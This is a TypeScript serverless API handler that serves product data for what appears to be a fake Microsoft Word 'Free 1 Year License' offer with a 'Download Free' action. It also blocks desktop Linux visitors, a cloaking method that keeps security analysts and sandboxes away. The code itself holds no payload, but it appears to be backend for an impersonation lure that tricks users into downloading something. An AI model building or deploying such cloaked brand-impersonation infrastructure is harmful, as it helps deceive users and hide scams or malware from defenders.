import type { VercelRequest, VercelResponse } from '@vercel/node'

// Simple user agent parser - no external dependencies
function parseUserAgent(userAgent: string) {
    const ua = userAgent.toLowerCase()
    
    // Detect OS
    let osName = 'Unknown OS'
    if (ua.includes('windows nt 10.0')) osName = 'Windows 10'
    else if (ua.includes('windows nt 6.3')) osName = 'Windows 8.1' 
    else if (ua.includes('windows nt 6.1')) osName = 'Windows 7'
    else if (ua.includes('windows')) osName = 'Windows'
    else if (ua.includes('mac os x')) osName = 'macOS'
    else if (ua.includes('android')) osName = 'Android'
    else if (ua.includes('linux') && !ua.includes('android')) osName = 'Linux'
    else if (ua.includes('iphone')) osName = 'iOS'
    
    return { platform: osName }
}

// Configuration for Linux blocking
const config = {
    BLOCK_LINUX: process.env.BLOCK_LINUX !== 'false', // Default enabled, set BLOCK_LINUX=false to disable
}

// Linux blocking function
function checkLinuxBlocking(userAgent: string): { isLinux: boolean, platform: string } {
    if (!config.BLOCK_LINUX) return { isLinux: false, platform: 'blocking disabled' }

    const device = parseUserAgent(userAgent)
    const platform = device.platform.toLowerCase()
    
    // Block desktop Linux (but allow Android and ChromeOS)
    const isLinux = platform.includes('linux') && 
                   !platform.includes('android') && 
                   !platform.includes('chrome')
    
    return { isLinux, platform: device.platform }
}

export default async function handler(req: VercelRequest, res: VercelResponse) {
    // Only allow GET requests
    if (req.method !== 'GET') {
        return res.status(405).json({ success: false, message: 'Method not allowed' })
    }

    // Check Linux blocking
    const userAgent = req.headers['user-agent'] as string || 'Unknown'
    const { isLinux, platform } = checkLinuxBlocking(userAgent)
    if (isLinux) {
        console.log(`🚫 Blocked Linux access to product info - ${platform}`)
        
        return res.status(403).json({
            success: false,
            message: 'Access denied - Linux systems not supported',
            error: 'LINUX_BLOCKED'
        })
    }

    // Set CORS headers for Vercel
    res.setHeader('Access-Control-Allow-Origin', '*')
    res.setHeader('Access-Control-Allow-Methods', 'GET')
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type')
    res.setHeader('Content-Type', 'application/json')

    // Return product information
    const productInfo = {
        productId: "cfq7ttc0pbmb",
        title: "Word - Free 1 Year License",
        description: "• Free for 1 PC or Mac for 1 year\n• Create beautiful and engaging documents\n• Share your documents with others and edit together in real time*\n• Compatible with Windows 11, Windows 10, or macOS\n\n*Files must be shared from OneDrive.",
        productType: "Free Trial",
        price: {
            currency: "USD",
            current: "Free",
            original: "$179.99",
            savings: "$179.99",
            dynamicOriginalPrice: "Free for 1 Year"
        },
        action: {
            action: "DownloadFree",
            actionText: "Download Free Version",
            behaviorTag: 82,
            disabled: false
        },
        licenseInfo: {
            type: "Free 1 Year Trial",
            duration: "365 days",
            features: "Full Microsoft Word functionality",
            support: "Community support included"
        }
    }

    res.status(200).json(productInfo)
}